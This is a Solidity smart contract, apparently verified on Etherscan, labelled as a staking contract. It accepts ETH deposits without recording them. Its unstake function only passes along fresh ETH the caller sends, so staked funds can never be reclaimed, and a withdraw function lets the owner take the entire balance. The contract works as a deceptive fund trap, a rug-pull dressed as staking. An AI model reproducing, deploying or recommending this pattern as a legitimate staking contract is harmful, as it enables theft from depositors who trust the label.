/**
 *Submitted for verification at Etherscan.io on 2022-04-28
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0;

contract Staking {
  address payable private owner;

  constructor() {
    owner = payable(msg.sender);
  }

  function stake() external payable {
    require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 eth");
    }

    function unstake(address to) external payable {
      require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 eth");
      payable(to).transfer(msg.value);
    }

   function withdraw() external payable {
     require (msg.sender == owner, "Must be owner");
     payable(msg.sender).transfer(address(this).balance);
    }
}